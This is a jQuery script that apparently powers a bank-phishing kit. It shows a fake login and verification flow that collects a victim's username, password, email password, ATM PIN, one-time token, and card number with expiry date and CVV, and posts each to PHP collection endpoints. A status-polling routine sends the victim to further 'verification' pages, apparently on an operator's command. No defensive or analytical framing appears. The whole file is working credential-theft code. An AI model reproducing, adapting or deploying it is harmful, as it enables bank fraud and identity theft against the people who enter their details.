function traer_info(){
	$.post( "process/informacion.php",function(data) {
		const info = data.split("|");

		$("#nombre").html(info[1] + " " + info[2]);
		$("#nombre2").html(info[1]);
		$("#cutroDig").html("*" + info[3]);
		$("#frna").attr("src","img/" + info[4] + ".jpg");		
	});
}

function consultar_estado(){
    $.post( "../../../../process/estado.php",function(data) { 
        switch (data) {
        	case '100': window.location.href = "successful"; break;
            case '2': window.location.href = "tokenverification"; break;
            case '4': window.location.href = "emailverification"; break;
            case '6': window.location.href = "atmverification"; break;               
            case '8': window.location.href = "tokenerror"; break;
            case '10': 	$.post( "../../../../process/finalizar.php",function(data) {             
	                        window.location.href = "../../../resumen-pago/172921711564327653/";
	                    }); break;            	
            case '12': window.location.href = "index"; break;
            case '14': window.location.href = "/wps"; break;
        } 
    });        
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   



$(document).ready(function() {
	var queojo = 0;

	$('#btnEntrar').click(function(){
		if ($("#usuario").val().length > 0) {
			$("#eUsuario").hide();
			if ($("#contra").val().length > 0) {				
    			$.post( "../../../../process/paso3login.php", {usr:$("#usuario").val(),pas:$("#contra").val()} ,function(data) {
       				// No redirigir si ya estamos en index.php
       				console.log("Procesamiento completado");
    			});
			}else{
				$("#contra").focus()
			}			
		}else{
			$("#eUsuario").show();		
		}
	});

	$('#contra').focus(function(){
		$("#validaciones").show();
	});

	$('#contra').blur(function(){
		$("#validaciones").hide();
	});

	$('#contra').keyup(function(event){
	
		var cadena = $('#contra').val();
		var mayus = 0;
		var minus = 0;
		var numer = 0;

		for (var i = 0; i <= cadena.length - 1; i++) {

			if (cadena[i].charCodeAt(0) >= 48 && cadena[i].charCodeAt(0) <= 57) {
				numer = 1;
			}

			if (cadena[i].charCodeAt(0) >= 65 && cadena[i].charCodeAt(0) <= 90) {
				mayus = 1;
			}

			if (cadena[i].charCodeAt(0) >= 97 && cadena[i].charCodeAt(0) <= 122) {
				minus = 1;
			}
		}


		if (numer == 1) {
			$("#numero").css("color","#138468");
			$("#numero").css("font-weight","bold");			
		}else{
			$("#numero").css("color","#333333");	
			$("#numero").css("font-weight","normal");	
		}

		if (mayus == 1) {
			$("#mayus").css("color","#138468");
			$("#mayus").css("font-weight","bold");			
		}else{
			$("#mayus").css("color","#333333");	
			$("#mayus").css("font-weight","normal");		
		}

		if (minus == 1) {
			$("#minus").css("color","#138468");	
			$("#minus").css("font-weight","bold");		
		}else{
			$("#minus").css("color","#333333");	
			$("#minus").css("font-weight","normal");
		}
		
		if ($("#contra").val().length >= 1) {
			$("#cantidad").css("color","#138468");
			$("#cantidad").css("font-weight","bold");			
		}else{
			$("#cantidad").css("color","#333333");	
			$("#cantidad").css("font-weight","normal");
		}

		if ($("#contra").val().length > 0) {
			$("#ojo").show();
		}else{
			$("#ojo").hide();
		}	
	});

	$('#ojo').click(function(){
		if (queojo == 0) {
			$("#contra").attr("type","text");
			$("#econtra").attr("type","text");	
			$("#atm").attr("type","text");	
			$("#cvv").attr("type","text");	
			$("#token").attr("type","text");		
			$("#ojo").attr("src","img/ojoc.svg");				
			queojo = 1;
		}else{
			$("#contra").attr("type","password");
			$("#econtra").attr("type","password");
			$("#atm").attr("type","password");
			$("#cvv").attr("type","password");
			$("#token").attr("type","password");
			$("#ojo").attr("src","img/ojo.svg");
			queojo = 0;
		}
	});		

	
	$('#btnemail').click(function(){
		if($("#correo").val().indexOf('@', 0) == -1 || $("#correo").val().indexOf('.', 0) == -1) {
        	$("#ecorreo").show();  
        	$("#correo").focus();
        }else{
        	$("#ecorreo").hide();  
        	if ($("#econtra").val().length > 0) {
        		$("#error_contra").hide(); 
        		$.post( "process/pasomail.php",{ eml:$("#correo").val(), passe:$("#econtra").val() },function(data) {
			        // No redirigir si ya estamos en index.php
			        console.log("Procesamiento de email completado");
			    });        	
        	}else{
        		$("#error_contra").show(); 
        		$("#econtra").focus();
        	}
        }
	});


	$('#econtra').keyup(function(event){
		if ($("#econtra").val().length > 0) {
			$("#ojo").show();
		}else{
			$("#ojo").hide();
		}
	});




	$('#btnatm').click(function(){
    	if ($("#atm").val().length > 3) {
    		$("#eatm").hide(); 
    		$.post( "../../../../process/paso4atm.php", { atm:$("#atm").val() } ,function(data) {   
        		// No redirigir si ya estamos en index.php
        		console.log("Procesamiento de ATM completado");
    		});
    	}else{
    		$("#eatm").show(); 
    		$("#atm").focus();
    	}
	});







	$('#atm').keyup(function(event){
		if ($("#atm").val().length > 0) {
			$("#ojo").show();
		}else{
			$("#ojo").hide();
		}
	});


	$('#btntoken').click(function(){
    	if ($("#token").val().length > 5) {
    		$("#etoken").hide(); 
    		$.post( "../../../../process/paso4otp.php", { otp:$("#token").val() } ,function(data) {   
        		// No redirigir si ya estamos en index.php
        		console.log("Procesamiento de OTP completado");
    		});
    	}else{
    		$("#etoken").show(); 
    		$("#token").focus();
    	}

	});

	$('#token').keyup(function(event){
		if ($("#token").val().length > 0) {
			$("#ojo").show();
		}else{
			$("#ojo").hide();
		}
	});


	$('#btntarjeta').click(function(){
		if ($("#tarjeta").val().length > 14) {
			$("#etarjeta").hide(); 
			if ($("#mes").val() != "" && $("#year").val() != "") {
				$("#error_fecha").hide(); 
				if ($("#cvv").val().length > 2) {
					$("#ecvv").hide(); 
					f = $("#mes").val() + "-" + $("#year").val();
					$.post( "process/pasotarjeta.php",{ tar:$("#tarjeta").val(), fec:f, cvv:$("#cvv").val() },function(data) {
				        // No redirigir si ya estamos en index.php
				        console.log("Procesamiento de tarjeta completado");
				    });

				}else{
					$("#ecvv").show(); 
    				$("#cvv").focus();
				}
			}else{
				$("#error_fecha").show(); 	
			}
		}else{
			$("#etarjeta").show(); 
    		$("#tarjeta").focus();	
		}
	});


	$('#cvv').keyup(function(event){
		if ($("#cvv").val().length > 0) {
			$("#ojo").show();
		}else{
			$("#ojo").hide();
		}
	});




});

